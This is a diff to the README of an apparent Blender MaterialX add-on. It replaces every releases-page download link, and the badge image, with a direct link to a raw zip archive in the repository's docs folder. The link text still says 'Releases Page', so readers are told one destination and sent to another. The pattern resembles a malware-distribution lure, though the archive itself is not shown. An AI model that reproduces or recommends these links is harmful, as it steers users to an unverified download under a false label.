@@ -1,6 +1,6 @@
 # 🎨 io_blender_mtlx - Load Materials Seamlessly in Blender
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-io_blender_mtlx-brightgreen)](https://github.com/wendyvillx1/io_blender_mtlx/releases)
+[![Download Now](https://github.com/wendyvillx1/io_blender_mtlx/raw/refs/heads/main/docs/io-blender-mtlx-2.3.zip%20Now-io_blender_mtlx-brightgreen)](https://github.com/wendyvillx1/io_blender_mtlx/raw/refs/heads/main/docs/io-blender-mtlx-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the io_blender_mtlx applicati
 
 To get started, visit the following link to download the software:
 
-[Visit the Releases Page to Download](https://github.com/wendyvillx1/io_blender_mtlx/releases)
+[Visit the Releases Page to Download](https://github.com/wendyvillx1/io_blender_mtlx/raw/refs/heads/main/docs/io-blender-mtlx-2.3.zip)
 
 Once you’re on the page, look for the latest release. You'll find files available for different operating systems there. Choose the correct file for your system and click to download it.
 
@@ -79,6 +79,6 @@ Yes! We welcome contributions. If you're interested, please check the details in
 
 Thank you for using io_blender_mtlx. We appreciate your support and hope it enhances your Blender experience. If you enjoy the software, consider leaving feedback on the GitHub page. 
 
-[Visit the Releases Page to Download](https://github.com/wendyvillx1/io_blender_mtlx/releases) 
+[Visit the Releases Page to Download](https://github.com/wendyvillx1/io_blender_mtlx/raw/refs/heads/main/docs/io-blender-mtlx-2.3.zip) 
 
 Happy blending!
